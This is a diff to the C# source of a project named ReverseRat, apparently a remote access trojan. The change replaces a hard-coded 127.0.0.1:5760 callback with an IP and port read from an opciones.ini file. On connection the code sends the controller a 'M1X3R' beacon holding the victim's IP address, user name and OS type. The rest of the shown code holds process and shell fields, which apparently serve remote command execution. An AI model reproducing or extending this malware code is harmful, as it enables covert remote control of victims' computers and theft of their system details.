@@ -24,7 +24,7 @@ namespace ReverseRat
         Process _processCmd;
         StringBuilder _strInput;
         Funciones LlamaFuncion = new Funciones();
-        string _mutexApp;
+        string _mutexApp, _ipConexion,_puertoConexion;
         private bool _shell;
 
         public FrmDummy()
@@ -65,7 +65,7 @@ namespace ReverseRat
             {
                 try
                 {                   
-                    _tcpClient.Connect("127.0.0.1", 5760);
+                    _tcpClient.Connect(_ipConexion, Convert.ToInt32(_puertoConexion));
                     _networkStream = _tcpClient.GetStream();
                     _streamReader = new StreamReader(_networkStream);
                     _streamWriter = new StreamWriter(_networkStream);
@@ -75,7 +75,7 @@ namespace ReverseRat
                     Console.WriteLine(err.Message);
                     return; 
                 }
-                EnviaDatos("M1X3R|" + LlamaFuncion.ObtenerIP() + "|" + LlamaFuncion.ObtenPCUser() + "|"+ LlamaFuncion.TipoSistemaOperativo() + "|"  + _mutexApp);
+                EnviaDatos("M1X3R|" + LlamaFuncion.ObtenerIp() + "|" + LlamaFuncion.ObtenPcUser() + "|"+ LlamaFuncion.TipoSistemaOperativo() + "|"  + _mutexApp);
              
             }
 
@@ -195,7 +195,10 @@ namespace ReverseRat
 
         private void Form1_Load(object sender, EventArgs e)
         {
-
+            var myIni = new IniFile("opciones.ini");
+            _ipConexion= myIni.Read("DefaultIP","opciones");
+            _puertoConexion = myIni.Read("DefaultPort", "opciones");
+            //MessageBox.Show(defaultVolume);
         }
     }
 }
